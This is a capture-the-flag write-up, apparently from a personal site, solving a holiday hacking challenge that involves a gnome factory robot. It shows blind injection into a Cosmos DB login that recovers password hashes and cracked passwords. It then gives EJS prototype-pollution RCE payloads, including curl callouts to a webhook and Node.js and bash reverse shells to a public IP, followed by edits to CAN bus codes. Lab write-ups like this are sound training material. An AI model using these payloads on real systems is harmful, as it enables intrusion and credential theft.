---
nav: |
  <table>
  <thead><tr><th><a href="/HHC_2025/act3_gnome_tea_mjd.html">Previous Objective: Act3 Gnome Tea</a></th> <th><a href="/HHC_2025/index.html">Table of Contents</a></th> <th><a href="/HHC_2025/act3_snowcat_mjd.html">Next Objective: Act3 Snowcat RCE and Privilege Escalation</a></th></table>
---
<table>
<thead><tr><th>Objective: Hack-a-Gnome</th> <th>Difficulty Level: 3</th><tr><td>Davis in the Data Center is fighting a gnome armyâ€”join the hack-a-gnome fun.</td> <td>Location: Data Center</td></table>
<h2>Solution Overview</h2>
Structure Query Language (SQL) injection was used to identify the database type, and then map the structure and contents of the table. This yielded two users and the associated password hashes. The hashes were known and were cracked using crackstation.net. This allowed for login to the application. The hint indicated that the statistics panel used a template. Node.js was identified using server response headers. EJS is the most popular template package for use with node.js, and it is vulnerable to remote code execution (RCE) from prototype pollution. Polluting the prototype with a remote shell payload gave access to the server. Once connected, a README.md file was located that mapped the code structure of the CAN bus. Assuming that the direction commands were in their own command range, and that the range started at the beginning of either the 2XX or 5XX range (because they were adjacent to the defined ranges). This allowed for the identification of the correct codes. Once corrected, the robot was manuevered through the maze to the power switch and the factory was powered down.
<table>
<thead><tr><th>Activity</th> <th>Primary Tactic</th> <th>MITRE ATT&CK Technique ID</th> <th>MITRE ATT&CK Technique Name</th><tr><td>Determine database type using SQL injection</td> <td>Discovery</td> <td>T1596.005</td> <td>Application Layer Protocol: SQL</td><tr><td>Determine database structure using SQL injection</td> <td>Discovery</td> <td>T1596.005</td> <td>Application Layer Protocol: SQL (used to enumerate schema, tables, columns)</td><tr><td>Determine usernames and password hashes using SQL injection</td> <td>Credential Access</td> <td>T1078 (Valid Accounts)</td> <td>Credentials from Databases</td><tr><td>Crack password hashes</td> <td>Credential Access</td> <td>T1110.002</td> <td>Password Cracking</td><tr><td>Remote code execution from prototype pollution</td> <td>Execution</td> <td>T1203</td> <td>Exploitation for Client Execution</td><tr><td>Decode CAN bus signals</td> <td>Discovery</td> <td>T1595</td> <td>Protocol Analysis</td></table>
<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>
<p>Starting with the login page, tested several injections attempting to identify the backend database. This nosql injection {â€œ$neâ€: null} creates an error:</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_dberror.jpg">Hack-a-Gnome Database Error</a> </p>
<p>The error message indicates the application is using Azure Cosmos DB!</p>
<p>Key Indicators:</p>
<p>1.	Microsoft.Azure.Documents.Common/2.14.0 - This is the Azure Cosmos DB SDK</p>
<p>2.	ActivityId - Cosmos DB uses ActivityIds for tracking queries</p>
<p>3.	Error code SC1010 - Cosmos DB-specific error code</p>
<p>4.	"invalid token '$'" - You likely triggered a syntax error in Cosmos DB's SQL-like query language</p>
<p>About Cosmos DB:</p>
<p>- Microsoft's NoSQL database service</p>
<p>- Uses a SQL-like query language (not standard SQL)</p>
<p>- Supports multiple APIs (SQL API, MongoDB API, Cassandra, etc.)</p>
<p>- This appears to be using the SQL API based on the error</p>
<p>Using the register functionality, it is possible to search for users using the syntax '" OR STARTWITH(c.username, "b") by observing the system response. If username starts with the string, the error message is "Username is taken". If it doesnt startwith the string, then the message is "Username is available". This pattern can be used to identify two users: bruce and harold.</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_user_identification.jpg">Hack-a-Gnome User Identification</a> </p>
<p>Using similar injection techniques, it is possible to map the database structure.  </p>
<p>- 'harold" AND IS_DEFINED(c.id)--' is used to identify the field ID  (harold is ID=1, bruce is ID=2)</p>
<p>- 'harold" AND IS_DEFINED(c.digest)--' is used to identify the field were the password digest is stored.</p>
<p>Using trial and error, the length of the digest can be determined using the injection: 'harold" AND Length(c.digest) = 32--' </p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_digest_length.jpg">Hack-a-Gnome Password Digest Length</a> </p>
<p>The digest can only consist of a limited number of characters: 0-9 and a-f. </p>
<p>Using the injection 'harold" AND STARTSWITH(c.digest) = "0"', it is possible to retrieve both digests.</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_digest.jpg">Hack-a-Gnome Password Digest</a> </p>
<p>Bruce digest: d0a9ba00f80cbc56584ef245ffc56b9e</p>
<p>Harold digest: 07f456ae6a94cb68d740df548847f459</p>
<p>Usiong crackstation.net, it is possible to crack both hashes.</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_digest_crack.jpg">Hack-a-Gnome Password Digest Crack</a> </p>
<p>Bruce password: oatmeal12</p>
<p>Harold password: oatmeal!!</p>
<p>Once logged in we are presented with the Smart Gnome Control Center as Bruce:</p>
<p>The hint indicates that we should be attempting prototype pollution of the statistics panel.</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_statistics_panel.jpg">Hack-a-Gnome Password Statistics Panel</a> </p>
<p>The following reference is helpful for understanding prototye polution: https://www.youtube.com/watch?v=W9_x8pc_bh8</p>
<p>Testing prototype pollution:</p>
<p>Key:__proto__</p>
<p>Subkey: toString</p>
<p>Value: a</p>
<p>Message: message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22toString%22%2C%22value%22%3A%22a%22%7D</p>
<p>Sending via Burp:</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_prototypepollution.jpg">Hack-a-Gnome PrototypePollution</a> </p>
<p>Results in a broken application:</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_prototypepollutionsuccess.jpg">Hack-a-Gnome PrototypePollutionSuccess</a> </p>
<p>Prototype pollution is possible. Server Headers indicate â€œExpressâ€ which is Node.js. The hint indicates that there are backend templates. Googling "what is the most common template package used with Node.js" indicates that EJS is the most popular package. EJS is also be susceptible to RCE using prototype pollution.</p>
<p>This is the payload:</p>
<pre><code>
{
  &quot;action&quot;: &quot;update&quot;,
  &quot;key&quot;: &quot;__proto__&quot;,
  &quot;subkey&quot;: &quot;outputFunctionName&quot;,
  &quot;value&quot;: &quot;x;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://YOUR-SERVER&#39;);s&quot;
}
</code></pre>
<p>URL Encoded:</p>
<pre><code>
message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl%20http%3A%2F%2FYOUR-SERVER&#39;)%3Bs%22%7D
</code></pre>
<p>Payload that uses webhook.site as a sensor:</p>
<pre><code>
message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl%20https%3A%2F%2Fwebhook.site%2Ff3bc21bc-b85f-4bb1-9bf2-bd4ac5767b96&#39;)%3Bs%22%7D
</code></pre>
<p>Webhook detects the connection:</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_webhookconnection.jpg">Hack-a-Gnome Webhook Connection</a> </p>
<p>Weaponizing with Node.JS reverse shell:</p>
<pre><code>
{
  &quot;action&quot;: &quot;update&quot;,
  &quot;key&quot;: &quot;__proto__&quot;,
  &quot;subkey&quot;: &quot;outputFunctionName&quot;,
  &quot;value&quot;: &quot;x;require(&#39;child_process&#39;).exec(&#39;node -e \\&#39;require(\&quot;net\&quot;).connect({port:4444,host:\&quot;173.255.237.30 \&quot;},function(){this.pipe(require(\&quot;child_process\&quot;).spawn(\&quot;/bin/sh\&quot;,[]).stdin);require(\&quot;child_process\&quot;).spawn(\&quot;/bin/sh\&quot;,[]).stdout.pipe(this);})\\&#39;&#39;);s&quot;
}
</code></pre>
<p>Setup a linode linux system with a public IP and a listener on port 4444 to catch the shell.</p>
<p>The message payload for the shell:</p>
<pre><code>
message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F173.255.237.30%2F4444%200%3E%261%5C%22&#39;)%3Bs%22%7D
</code></pre>
<p>!<a href="/HHC_2025/images/hack-a-gnome_reverseshell.jpg">Hack-a-Gnome Reverse Shell</a> </p>
<p>Once the payload is sent, trigger a refresh in the application to load the payload (change name + refresh).</p>
<p>The README.md shows that CAN IDs are grouped by type or purpose. 400 codes are requests, 300 codes are status. It is reasonable to assume that commands are a separate group, either 200 or 500 codes.Lets start with 200, and assume they are sequential. Letâ€™s start with 200-204.  While the shell is active, it is not possible to get any feedback to commands. The process is to connect,  change the python file, disconnect, and then test.</p>
<pre><code>
sed -i &#39;s/0x244/0x200/g&#39; canbus_client.py   # up
sed -i &#39;s/0x245/0x201/g&#39; canbus_client.py   # down
sed -i &#39;s/0x246/0x202/g&#39; canbus_client.py   # left
sed -i &#39;s/0x247/0x203/g&#39; canbus_client.py   # right
</code></pre>
<p>Trial and error reveals the codes:</p>
<p>- 0x201 = UP  </p>
<p>- 0x202 = DOWN  </p>
<p>- 0x204 = RIGHT </p>
<p>- 0x203 = LEFT </p>
<p>With control of the robot, boxes need to be moved so the power switch can be reached. The robot can only move a single box, so that limits the path.</p>
<p>!<a href="/HHC_2025/images/hack-a-gnome_solution.jpg">Hack-a-Gnome Solution</a> </p>
<p><strong>Answer: Reach the power switch and shut down the factory</strong></p>
</details>
<h2>Tools Reference</h2>
<table>
<thead><tr><th>Tools Used</th> <th>Tool Version</th><tr><td>crackstation.net</td> <td>N/A</td> <td></td><tr><td>Burp Suite Community Edition</td> <td>v2024.11.2</td><tr><td>Claude.ai</td> <td>4.5</td> <td></td><tr><td>Linux Linode</td> <td>System Ubuntu 24.04 LTS</td><tr><td>Webhook.net</td> <td>N/A</td></table>
<h2>Hints Reference</h2>
<table>
<thead><tr><th>Provided By</th> <th>Hint</th><tr><td>Santa</td> <td>Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.</td><tr><td>Santa</td> <td>Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.</td><tr><td>Santa</td> <td>I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again).</td><tr><td>Santa</td> <td>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.</td><tr><td>Santa</td> <td>Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.</td><tr><td>Santa</td> <td>Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.</td><tr><td>Chris</td> <td>Hey, I could really use another set of eyes on this gnome takeover situation. Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more! But every system has weaknesses if you know where to look. Ready to help me turn one of these rebellious bots against its own kind?</td></table>
<h2>Acknowledgements</h2>
<table>
<thead><tr><th>Provided By</th> <th>Notes</th><tr><td>fluffme</td> <td>Gave me clues about using server side java for prototype pollution. Suggested using Webhook and Linode for testing connections and then establishing them. This allowed me to solve the challenge without changing my machine's security posture.</td></table>
<table>
<thead><tr><th><a href="/HHC_2025/act3_gnome_tea_mjd.html">Previous Objective: Act3 Gnome Tea</a></th> <th><a href="/HHC_2025/index.html">Table of Contents</a></th> <th><a href="/HHC_2025/act3_snowcat_mjd.html">Next Objective: Act3 Snowcat RCE and Privilege Escalation</a></th></table>